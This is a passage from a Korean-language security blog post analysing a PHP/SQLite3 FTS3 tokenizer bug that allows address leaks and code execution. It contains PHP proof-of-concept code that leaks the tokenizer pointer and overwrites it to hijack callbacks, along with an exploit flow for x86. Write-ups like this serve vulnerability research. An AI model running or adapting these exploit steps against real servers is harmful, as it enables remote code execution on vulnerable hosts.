    <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":memory:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select hex(fts3_tokenizer('simple')) addr;"</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$leaked_addr</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token variable">$leaked_addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre></div>
<ul>
<li>취약한 부분의 쿼리를 PHP 코드로 작성하여 쿼리를 수행하여 메모리 릭을 진행합시다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 502px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 11.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAd0lEQVQI123KzQ6CMBhE0Q80xo2KSilQSgui/AiuXPj+L3aNNe5cTCaTOZKcHFU9Yd0dY0dqP3NWDbq44pqFLO/ITY/SXdhp1gZr/Rxsqi8Upqe0IxLtkbIamJZXOH37CH0bnmy2CpEd0SpB4sMXf/pPfiZeH3kDitwye+jIRWAAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png"
        srcset="/static/ece3868599479ae40e51537c45dfb6e1/e9ff0/6.png 180w,
/static/ece3868599479ae40e51537c45dfb6e1/f21e7/6.png 360w,
/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png 502w"
        sizes="(max-width: 502px) 100vw, 502px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>그렇다면, 해당 부분은 왜 메모리 릭이 가능하지 살펴봅시다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token comment">/* Load the built-in tokenizers into the hash table */</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> rc<span class="token operator">==</span><span class="token constant">SQLITE_OK</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">sqlite3Fts3HashInsert</span><span class="token punctuation">(</span>pHash<span class="token punctuation">,</span> <span class="token string double-quoted-string">"simple"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-declaration">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pSimple<span class="token punctuation">)</span>
     <span class="token operator">||</span> <span class="token class-name">sqlite3Fts3HashInsert</span><span class="token punctuation">(</span>pHash<span class="token punctuation">,</span> <span class="token string double-quoted-string">"porter"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-declaration">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pPorter<span class="token punctuation">)</span> 
     <span class="token operator">||</span> <span class="token punctuation">(</span>pIcu <span class="token operator">&amp;&amp;</span> <span class="token function">sqlite3Fts3HashInsert</span><span class="token punctuation">(</span>pHash<span class="token punctuation">,</span> <span class="token string double-quoted-string">"icu"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-declaration">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pIcu<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">{</span>
      rc <span class="token operator">=</span> <span class="token constant">SQLITE_NOMEM</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">const</span> sqlite3_tokenizer_module simpleTokenizerModule <span class="token operator">=</span> <span class="token punctuation">{</span>
 <span class="token number">0</span><span class="token punctuation">,</span>
 simpleCreate<span class="token punctuation">,</span>
 simpleDestroy<span class="token punctuation">,</span>
 simpleOpen<span class="token punctuation">,</span>
 simpleClose<span class="token punctuation">,</span>
 simpleNext<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
<ul>
<li><code class="language-text">built-in tokenizer</code> 는 hash-table에 로드되며 해당 주소는 libsqlite3 의 .bss 섹션을 참조되고 있습니다.</li>
</ul>
<h3 id="sqlite-fts3_tokenizer-fts3_tokenizer" style="position:relative;"><a href="#sqlite-fts3_tokenizer-fts3_tokenizer" aria-label="sqlite fts3_tokenizer fts3_tokenizer permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SQLite fts3_tokenizer(), fts3_tokenizer()</h3>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token function">fts3_tokenizer</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>tokenizer<span class="token operator">-</span>name<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token constant">SELECT</span> <span class="token function">fts3_tokenizer</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>tokenizer<span class="token operator">-</span>name<span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>sqlite3_tokenizer_module ptr<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<ul>
<li>하나의 인수, 두 개의 인수로 fts3_tokenizer 함수를 호출할 수 있습니다. 첫 번째 인자는 해당 함수에서 <code class="language-text">tokenizer</code>를 식별하는 문자열이며 <code class="language-text">slqite3_tokenizer_module</code> 구조체에 대한 포인터입니다.</li>
<li>즉, 하나의 인수가 전달되면 현재 등록된 tokenizer 구현에 대한 포인터가 반환되고 두 번째 인수는 tokenizer를 등록할 사본이 반환되어 집니다.</li>
</ul>
<h2 id="fts3-callback을-통한-임의의-코드-실행-취약점" style="position:relative;"><a href="#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90" aria-label="fts3 callback을 통한 임의의 코드 실행 취약점 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fts3 callback을 통한 임의의 코드 실행 취약점</h2>
<ul>
<li>앞서 취약한 부분의 쿼리인 <code class="language-text">fts3_tokenizer</code> 두 번째 인자에 임의의 값을 입력한 경우 크래쉬가 발생한 것을 확인할 수 있습니다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">getmypid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token number">0x1212</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">flip</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">-=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":memory:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select hex(fts3_tokenizer('simple')) addr;"</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$leaked_addr</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token variable">$leaked_addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":memory:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select fts3_tokenizer('simple', x'4141414141414141');
        create virtual table a using fts3(tokenizer=simple);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span>
</code></pre></div>
<ul>
<li>크래쉬가 발생한 부분을 분석해보면 <code class="language-text">rbp</code> 레지스터 값이 <code class="language-text">fts3_tokenizer</code> 두 번째 파라미터인 것을 확인할 수 있습니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 68.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACH0lEQVQ4y5WTe3OaUBDFb9SoURAEAXnJQyHg+xk1PpMYTaYzneb7f5jTudsmjTNJ0/6xc2GA356ze2Cu18FossNydYTf7OMiK0NWGqjpISw3hVR16fqqbNCzTK7612KiZGO+PODu8B3D8RaXhRpsN4UX9KhJ0BqgIjvIXir/BiyLJkaTLW7XJ6SdG/rQMGPo9RZ6gxXC1hAlwQS7qNAHX0GZKDkEO5xeMJntSWHQHJDKTm9Jlr9SdQbk3QejNea3j4iTKQEtJ4FmtCBULDAm/h/wTeHxBcPxhoB+2CdgWeTAMtmlykhnxe2/1huQqxiMNlisjkg7c+TyKkwnIXVOo01gpRZA1QJqkC9qKJZ0Oj9UyDfIt/nw+IOW8GqZw9bbZ4yne1JuOSkBOZg34dH61PJ4usNq84Tu4JaAdSsmIM+naV+j4XdpUbRtPgIm0gg+tMxzOJvfY7v/RlvlQNNOCMoVzuYPaHcXuFkcaLZ8FLw+XQqPBQfu7n4B+Qw9vwvHTckq/5OEik3x4c0F0UKxZPzJJQe9V3glmBjP9lhunhC3Z8jmVWj1CLoZoTdao91bwrBiMCYgV6hBUhqo1gLIqgdGoPOgs8iOsZ7ucNo9Y5hMUMkrCK0IgRXRfeQmMKsu1LIBTTRRlx0qU3ZQyau/oe+Am/YUfb+DSPMRKg0YBZVOv+rAk2yEagO+7CDSAzRrHr3X0nxc6wGskgaWOQf+BFo6ZHwLayVXAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="php_in.png"
        title="php_in.png"
        src="/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png"
        srcset="/static/895cf1cf65041b4a6f0abd6f963b6726/e9ff0/php_in.png 180w,
/static/895cf1cf65041b4a6f0abd6f963b6726/f21e7/php_in.png 360w,
/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png 720w,
/static/895cf1cf65041b4a6f0abd6f963b6726/1cfc2/php_in.png 900w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>SQLite3가 <code class="language-text">xCreate</code> callback function pointer를 호출하였고 이에 대한 Callback 호출에 대한 임계값 검증이 존재하지 않았기 때문에 발생하였습니다.</li>
</ul>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_tokenizer.c</span>
m <span class="token operator">=</span> <span class="token punctuation">(</span>sqlite3_tokenizer_module <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sqlite3Fts3HashFind</span><span class="token punctuation">(</span>pHash<span class="token punctuation">,</span>z<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>m <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">sqlite3Fts3ErrMsg</span><span class="token punctuation">(</span>pzErr<span class="token punctuation">,</span> <span class="token string">"unknown tokenizer: %s"</span><span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span>
    rc <span class="token operator">=</span> SQLITE_ERROR<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
    rc <span class="token operator">=</span> m<span class="token operator">-></span><span class="token function">xCreate</span><span class="token punctuation">(</span>iArg<span class="token punctuation">,</span> aArg<span class="token punctuation">,</span> ppTok<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">assert</span><span class="token punctuation">(</span> rc<span class="token operator">!=</span>SQLITE_OK <span class="token operator">||</span> <span class="token operator">*</span>ppTok <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> rc<span class="token operator">!=</span>SQLITE_OK <span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token function">sqlite3Fts3ErrMsg</span><span class="token punctuation">(</span>pzErr<span class="token punctuation">,</span> <span class="token string">"unknown tokenizer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>ppTok<span class="token punctuation">)</span><span class="token operator">-></span>pModule <span class="token operator">=</span> m<span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>
    <span class="token function">sqlite3_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>aArg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span></code></pre></div>
<h2 id="xopen-취약점" style="position:relative;"><a href="#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90" aria-label="xopen 취약점 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>xOpen 취약점</h2>
<div class="gatsby-highlight" data-language="sql"><pre class="language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> exploit <span class="token keyword">values</span><span class="token punctuation">(</span>x<span class="token string">"9090909090909090"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<ul>
<li>현 쿼리의 “exploit” 테이블은 앞에서 create 쿼리문으로 생성이 된후 insert 쿼리문을 이용해서 데이터를 삽입할 경우 <code class="language-text">xOpen</code> Callback function pointer가 수행됩니다.</li>
<li><code class="language-text">xOpen</code> 은 값 으로 0x9090909090909090 16진수를 <code class="language-text">pInput1</code> 매개 변수로 사용하여 CallBack 과 같이 트리거 됩니다.</li>
</ul>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_expr.c</span>
sqlite3_tokenizer_module <span class="token keyword">const</span> <span class="token operator">*</span>pModule <span class="token operator">=</span> pTokenizer<span class="token operator">-></span>pModule<span class="token punctuation">;</span>
sqlite3_tokenizer_cursor <span class="token operator">*</span>pCsr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> rc<span class="token punctuation">;</span>
rc <span class="token operator">=</span> pModule<span class="token operator">-></span><span class="token function">xOpen</span><span class="token punctuation">(</span>pTokenizer<span class="token punctuation">,</span> z<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pCsr<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<ul>
<li>이를 이용해서 예측이 가능한 메모리 위치에 대상 주소를 만들고 메모리 주소에 있어 <code class="language-text">fts3_tokenizer</code> 의 Callback 을 트리거하여 다음 프로그램 카운터를 조작해 원하는 파라미터 값을 컨트롤해 공격 연계가 가능합니다.</li>
</ul>
<h1 id="fts3-php-rce-exploitation" style="position:relative;"><a href="#fts3-php-rce-exploitation" aria-label="fts3 php rce exploitation permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fts3 PHP RCE Exploitation</h1>
<h2 id="exploit-공격-흐름도" style="position:relative;"><a href="#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84" aria-label="exploit 공격 흐름도 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Exploit 공격 흐름도</h2>
<div class="gatsby-highlight" data-language="sql"><pre class="language-sql"><code class="language-sql">$sqlite3_lib_leaked_tokenizer <span class="token operator">=</span> sqlQuery<span class="token punctuation">(</span><span class="token string">"select hex(fts3_tokenizer('simple')) addr"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$libsqlite3_addr <span class="token operator">=</span> flip<span class="token punctuation">(</span>$sqlite3_lib_leaked_tokenizer<span class="token punctuation">)</span><span class="token punctuation">;</span>
$libsqlite3_base <span class="token operator">=</span> $libsqlite3_addr <span class="token operator">-</span> $leaked_simple_tokenizer_offset<span class="token punctuation">;</span>

$payload <span class="token operator">=</span> <span class="token number">0x9090909090909090</span><span class="token punctuation">;</span> <span class="token comment">// payload </span>
sqlQuery<span class="token punctuation">(</span><span class="token string">"select fts3_tokenizer('simple', ?);"</span><span class="token punctuation">,</span> $payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
sqlQuery<span class="token punctuation">(</span><span class="token string">"create table a using fts3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// crash</span></code></pre></div>
<ul>
<li>다음과 같은 형태로 취약점 Exploit 흐름이 진행되어 집니다.</li>
<li>x86 환경에서의 취약점은 <code class="language-text">xCreate</code> 의 Callback 트리거 만으로 Exploit 진행이 어렵다고 판단하여 <code class="language-text">xOpen</code> 의 인자 트리거를 통해 진행하였습니다.</li>
</ul>
<h2 id="x86bit-환경-php-with-sqlite3-fts3-tokenizer-rce-취약점" style="position:relative;"><a href="#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90" aria-label="x86bit 환경 php with sqlite3 fts3 tokenizer rce 취약점 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</h2>
<h3 id="fts3_tokenizer-info-leak" style="position:relative;"><a href="#fts3_tokenizer-info-leak" aria-label="fts3_tokenizer info leak permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fts3_tokenizer info leak</h3>
<ul>
<li>leak 된 simple tokenizer의 주소 값을 리틀 엔디안으로 변경 작업을 진행시 4바이트 기준으로 fllip을 진행합니다.</li>
</ul>
<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">flip</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

  <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$val</span><span class="token punctuation">;</span>
